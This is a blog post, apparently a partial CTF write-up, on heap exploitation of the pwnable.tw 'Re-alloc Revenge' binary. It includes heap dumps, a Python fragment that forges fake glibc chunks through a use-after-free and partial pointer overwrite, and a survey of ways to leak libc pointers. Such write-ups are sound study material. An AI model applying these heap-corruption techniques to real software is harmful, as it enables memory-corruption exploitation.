---
layout: post
title:  "Pwnable.tw - Re-alloc Revenge"
date:   2025-01-14 19:59:45 +0300
categories: jekyll update
---

**Contents**
* TOC
{:toc}
## Re-alloc Revenge

```bash
$ checksec ./re-alloc_revenge
[*] '/home/itay/projects/pwnable_tw/re-alloc_revenge/re-alloc_revenge'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    FORTIFY:    Enabled
    Stripped:   No

$ file ./re-alloc_revenge
./re-alloc_revenge: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./ld-2.29.so, for GNU/Linux 3.2.0, BuildID[sha1]=a93ffa9d1472955c6ee86b3c19759e6295f65f70, not stripped
```

Very similar to re-alloc challenge (also same libc) - but this time, PIE and full RELRO are enabled.

## Overview

The challenge is identical to Re-alloc, but with harsher mitigations. \
This means that as before, we have UAF, allowing us to overwrite freed chunk's metadata. 

### Write Primitive

We have the exact same write primitive as before - we can freely write into chunks metadata. This gives us arbitrary-write freely. 

### Read Primitive

The main challenge is that we don't have any leak. \
A cool trick we can do, is utilize the fact that our write primitive starts overwriting chunk's `next` pointer. 
Hence, even without a heap leakage, due to ASLR not affecting the lowermost 12 bits, we can (almost) deterministically overwrite heap addresses, by only writing their 2 LSBs (we would win at 1/16 chance, as there should be one randomized nibble). \
So by doing so, **we have arbitrary heap write primitive, without the need for any leak** - without randomization if we fall within the same `0x100` bytes scope, or with `1/16` chance for the generic heap-address case. How can we leverage this to an arbitrary read (or at least, libc leak)? \
My general idea is to start by popping libc pointers on the heap, and go on from there. The heap seems pretty empty, except for one extra chunk, the `tcache_perthread_struct`:

```bash
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x64257eba6000
Size: 0x250 (with flag bits: 0x251)

Free chunk (tcachebins) | PREV_INUSE
Addr: 0x64257eba6250
Size: 0x30 (with flag bits: 0x31)
fd: 0x64257eba6290

Free chunk (tcachebins) | PREV_INUSE
Addr: 0x64257eba6280
Size: 0x30 (with flag bits: 0x31)
fd: 0x00

Top chunk
Addr: 0x64257eba62b0
Size: 0x20c00 (with flag bits: 0x20c00)
```

This is the first allocated chunk:

```c
# define TCACHE_MAX_BINS		64
typedef struct tcache_perthread_struct
{
  char counts[TCACHE_MAX_BINS];
  tcache_entry *entries[TCACHE_MAX_BINS];
} tcache_perthread_struct;
```

Hence, a total of `64 * (1 + 8) = 0x240` bytes. 
As we can see, including the metadata, it have been allocated within a bin corresponds to size class `0x250`. \
This gives me a new idea - while we can regularly allocate only chunks within the tcache range, because we have arbitrary heap-write primitive, we can create fake chunks - having sizes outside of the tcache range. Such chunks deallocations might leave trails of their corresponding bin heads of the `main_arena` within their `fd, bk` - hence, leave trails of libc pointers within the heap. \
I've tried and eventually suceedded to create chunk that would have size class past the limit of `0x80` (in this case, `0x90`):

```python
fake_size = 0x90
    # Allocate chunks
    fake_chunk = p64(0)         # will get corrupted by next
    fake_chunk += p64(0)        # and by key
    fake_chunk += p64(0)        # prev_size
    fake_chunk += p64(fake_size | 0x1)     # new size
    alloc(p, 0, alloc_size, fake_chunk)    

    fake_next_chunk = b'A' * (fake_size - chunkSize(alloc_size) + 0x10)
    fake_next_chunk += p64(fake_size)  # prev_size, match the fake chunk
    fake_next_chunk += p64(fake_size | 0x1)
    alloc(p, 1, alloc_size, fake_next_chunk)

    # Make sure the second chunk's next is initialized to non-NULL
    free(p, 0)
    realloc(p, 1, 0, b'')

    # Overwrite 'next' LSB, so that it would point to the fake chunk
    realloc(p, 1, alloc_size, b'\x80')

    # Consume tcachebin head. Now the fake chunk is the tcache head!
    alloc(p, 0, alloc_size, p64(0))

    # We now want the 2 slots to be available. 
    # Increment size, prepare to free on different bin
    realloc(p, 1, alloc_size + 0x10, fake_chunk)
    # Return 
    free(p, 1)
    # The same for the other chunk
    realloc(p, 0, alloc_size + 0x20, fake_chunk)
    free(p, 0)

    # Consume the fake chunk, to be sent to its fake freelist!
    alloc(p, 0, alloc_size, b'B')
    # Notice - we MUST make sure its fake 'next' chunk isn't beyond top. 
    # That's why I had to forge a perfect fake next chunk for. 
    # Free it. Now libc pointers would be here!
    free(p, 0)
```

... only to recall it is still within the tcache range (but not within the fastbins T_T). \
This means that the chunk I'd like to fake should be at least `0x200` bytes (or is it `0x100` for this glibc version), such that it wouldn't fall within the tcache for sure (or alternatively - populate the unsorted bin). \
The `tcache_perthread_struct` chunk seems as a yummy target, yet recall it doesn't contains any libc pointers at all. 

At this point I've decided there are very few options in which we can pop libc pointers:

1. Rely on other heap structures. We don't have anything though, yay. Can we somehow spawn some stuff on the heap? Such as file structs?

2. Try harder to create non-tcache non-fastbin chunks. This way, upon freeing them, they would leave `fd, bk` that would point to their head within libc's main arena. But.. its hard, due to the next chunk's size checks. Because we have only 2 small allocations, we cannot forge chunks further enough to mimic the fake next chunk. 

3. Use the heap arbitrary write primitive, such that the `tcache_perthread_struct` would be considered as a legitimate chunk to-be-freed, while making sure its size class `>=0x200`. 

4. Mess with the top chunk. Exhausing it would eventually leave `fd, bk` pointers - just as a regular chunk. As mentioned, we cannot exhaust it legitimately, as we cannot make enough allocations. However, we can utilize the heap-arbitrary-write in order to overwrite its size to some very low value, hence - exhaust the top chunk. Notice that there are few mitigations regarding the top chunk, the hardest one requires it to end within a page boundary. Unfortuanately, this means we have to be able to make around ~`0x1000` bytes of allocations (as the heap is nearly empty) in order to exhaust the top chunk, and cause it to free. Because we're limited for only `2` small allocations, this probably won't work. 

Out of the proposed ideas, the only viable one seems to be option (3). 



